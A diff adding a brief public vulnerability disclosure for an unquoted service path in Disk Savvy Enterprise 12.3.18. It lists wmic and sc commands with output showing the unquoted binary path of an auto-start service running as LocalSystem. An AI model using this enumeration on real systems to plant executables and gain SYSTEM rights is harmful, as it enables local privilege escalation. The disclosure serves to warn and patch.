@@ -1,0 +1,24 @@
+Exploit Title: Disk Savvy Enterprise 12.3.18 - Unquoted Service Path
+Exploit Author: boku
+Date: 2020-02-10
+Vendor Homepage: http://www.disksavvy.com
+Software Link: http://www.disksavvy.com/setups/disksavvyent_setup_v12.3.18.exe
+Version: 12.3.18
+Tested On: Windows 10 (32-bit)
+
+C:\Users\nightelf>wmic service get name, pathname, startmode | findstr "Disk Savvy" | findstr /i /v """
+Disk Savvy Enterprise      C:\Program Files\Disk Savvy Enterprise\bin\disksvs.exe      Auto
+
+C:\Users\nightelf>sc qc "Disk Savvy Enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Disk Savvy Enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files\Disk Savvy Enterprise\bin\disksvs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Savvy Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
